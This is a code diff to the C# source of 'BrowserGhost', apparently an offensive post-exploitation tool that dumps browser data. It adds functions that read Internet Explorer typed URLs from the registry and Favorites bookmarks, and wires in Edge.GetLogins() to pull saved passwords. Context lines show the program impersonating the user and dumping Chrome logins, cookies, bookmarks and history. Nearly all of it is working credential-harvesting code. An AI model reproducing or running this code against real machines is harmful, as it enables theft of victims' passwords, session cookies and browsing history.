@@ -7,8 +7,9 @@ using System.IO;
 using CS_SQLite3;
 using System.Management;
 using System.Runtime.InteropServices;
-
-
+using Microsoft.Win32;
+using System.Text.RegularExpressions;
+using SharpEdge;
 
 
 namespace BrowserGhost
@@ -488,8 +489,65 @@ namespace BrowserGhost
             
             return false;
         }
-        
 
+        public static bool IE_history()//system 获取history时有点问题 
+        {
+            string info = "";
+
+            RegistryKey Key;
+
+            Key = Registry.CurrentUser;
+            RegistryKey myreg = Key.OpenSubKey("Software\\Microsoft\\Internet Explorer\\TypedURLs");
+            string[] urls = new string[26];
+
+            for (int i = 1; i < 26; i++)
+            {
+                try
+                {
+                    info = myreg.GetValue("url" + i.ToString()).ToString();
+                    
+                    urls[i] = info;
+                }
+                catch
+                {
+                    ;
+                }
+            }
+            foreach (string url in urls)
+            {
+                if (url != null)
+                {
+                    Console.WriteLine("\t{0}", url);
+                }
+
+            }
+
+          
+            return true;
+        }
+
+        public static bool IE_books()
+        {
+            string book_path = Environment.GetFolderPath(Environment.SpecialFolder.Favorites);
+
+            string[] files = Directory.GetFiles(book_path, "*.url", SearchOption.AllDirectories);
+
+            foreach (string url_file_path in files)
+            {
+                if (File.Exists(url_file_path) == true)
+                {
+
+                    string booktext = File.ReadAllText(url_file_path);
+
+                    Match match = Regex.Match(booktext, @"URL=(.*?)\n");
+                    Console.WriteLine("\t" + url_file_path);
+                    Console.WriteLine("\t\t" + match.Value);
+
+                }
+            }
+
+            return true;
+        }
 
         static void Main(string[] args)
         {
@@ -514,20 +572,36 @@ namespace BrowserGhost
                     Console.WriteLine("[*] Impersonate user {0}", Environment.UserName);
                     Console.WriteLine("[*] Current user {0}", Environment.UserName);
 
+                    Console.WriteLine("===============Chrome=============");
                     //密码
-                    Console.WriteLine("\n[*] Start Get Chrome Login Data");
+                    Console.WriteLine("\n[*]Get Chrome Login Data");
                     Chrome_logins();
 
                     //获取书签
-                    Console.WriteLine("\n[*] Start Get Chrome Bookmarks");
+                    Console.WriteLine("\n[*]Get Chrome Bookmarks");
                     Chrome_books();
 
                     //cookie
-                    Console.WriteLine("\n[*] Start Get Chrome Cookie");
+                    Console.WriteLine("\n[*]Get Chrome Cookie");
                     Chrome_cookies();
 
-                    Console.WriteLine("\n[*] Start Get Chrome History");
+                    Console.WriteLine("\n[*]Get Chrome History");
                     Chrome_history();
+
+                    //-----------------------IE----------------
+
+                    Console.WriteLine("===============IE=============");
+
+                    
+
+                    Console.WriteLine("\n[*]Get IE Books");
+                    IE_books();
+
+                    Console.WriteLine("\n[*]Get IE Password");
+                    Edge.GetLogins(); //.net2 提取这个密码太复杂了 参考至 https://github.com/djhohnstein/SharpWeb/raw/master/Edge/SharpEdge.cs
+
+                    Console.WriteLine("\n[*]Get IE History");
+                    IE_history();
 
                     //回退权限
                     RevertToSelf();
